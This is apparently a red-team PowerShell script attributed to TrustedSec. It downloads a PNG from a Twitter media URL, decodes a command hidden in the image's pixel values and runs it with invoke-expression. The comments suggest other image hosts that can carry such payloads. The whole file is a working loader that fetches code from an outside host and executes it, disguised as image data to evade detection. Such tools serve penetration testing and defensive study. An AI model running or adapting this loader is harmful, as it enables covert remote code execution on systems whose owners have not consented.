# reads in image file - in this instance, from a tweeted image
# other good candidates would be: wikimedia/wikipedia, google image search URLs, any place you can post an image
# @nyxgeek / YOLO - TrustedSec 2017 - 2018

function readIMGDevil(){
        $tempString = "" 
        Foreach($y in (0..($BitMap.Height-1))) { 
           Foreach($x in (1..($BitMap.Width-1))) { 
                    $Pixel = $BitMap.GetPixel($X,$Y)
                    $pixelValue = "$($pixel.R.tostring())"

                    if ( [int]$pixelValue -lt 128 ){
                        $alphaValue = "$($pixel.A.toString())"
                        # LOOK FOR OUR END OF FILE INDICATOR - we had set our terminating char by changing alpha to be 42 and R to be 42
                        if ( ([int]$pixelValue -eq 42) -And ( "$alphaValue"-eq "42" ) ){
                            return $tempString
                        }
                        $tempstring+="$([char]([convert]::toint16($pixelValue)))"
}}}}         
[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); 
$webpath = "https://pbs.twimg.com/media/DUUb7yQVQAEGZDp.png"
$r = [System.Net.WebRequest]::Create("$webpath")
$resp = $r.GetResponse()
if ( $resp -ne $null ){
$Bitmap = [System.Drawing.Bitmap]::FromStream($resp.GetResponseStream())
#echo "$(readIMGDevil)"
invoke-expression "$(readIMGDevil)"
}
